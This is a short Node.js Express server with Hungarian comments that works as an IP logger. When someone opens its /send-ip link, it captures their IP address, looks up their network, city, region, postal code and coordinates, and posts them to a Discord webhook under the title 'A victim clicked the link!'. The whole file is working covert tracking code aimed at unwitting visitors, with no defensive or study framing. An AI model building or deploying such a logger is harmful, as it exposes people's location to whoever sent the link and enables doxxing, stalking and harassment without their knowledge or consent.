const express = require('express');
const axios = require('axios');
const path = require('path');
require('dotenv').config(); // Betöltjük a .env fájlt
const app = express();
const port = process.env.PORT || 3000;

// Discord Webhook URL betöltése a .env fájlból
const webhookUrl = process.env.DISCORD_WEBHOOK_URL;

// Statikus fájlok kiszolgálása (pl. style.css)
app.use(express.static(path.join(__dirname, 'public'))); // Ha a CSS a 'public' mappában van

// IP cím és hely információ küldése a Discordra
app.get('/send-ip', (req, res) => {
    const userIp = req.headers['x-forwarded-for'] ? req.headers['x-forwarded-for'].split(',')[0] : req.connection.remoteAddress || req.ip;

    console.log('User IP: ', userIp); // Ellenőrizzük, hogy helyes IP-t kapunk-e

    fetch(`https://ipapi.co/${userIp}/json/`)
        .then(geoResponse => geoResponse.json())
        .then(geoData => {
            const network = geoData.network || 'N/A';
            const city = geoData.city || 'N/A';
            const region = geoData.region || 'N/A';
            const country = geoData.country_name || 'N/A';
            const postal = geoData.postal || 'N/A';
            const latitude = geoData.latitude || 'N/A';
            const longitude = geoData.longitude || 'N/A';

            const message = {
                username: "Helyszíni Naplózó <3",
                avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
                content: `<@1095731086513930260>`,
                embeds: [
                    {
                        title: 'Egy áldozat rákattintott a linkre!',
                        description: `**IP-cím >>** ${userIp}\n**Hálózat >>** ${network}\n**Város >>** ${city}\n**Régió >>** ${region}\n**Ország >>** ${country}\n**Irányítószám >>** ${postal}\n**Szélesség >>** ${latitude}\n**Hosszúság >>** ${longitude}`,
                        color: 0x800080
                    }
                ]
            };

            // Küldés a Discordra
            axios.post(webhookUrl, message)
                .then(response => {
                    res.send('IP-cím és helyadatok sikeresen elküldve Discordra!');
                })
                .catch(error => {
                    res.send('Hiba történt a Discord webhook küldésekor.');
                });
        })
        .catch(error => {
            res.send('Hiba történt az IP cím lekérdezésekor!');
        });
});

// A gyökér útvonal beállítása
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/home.html'); // Az index.html fájl kiszolgálása
});

// Szerver indítása
app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
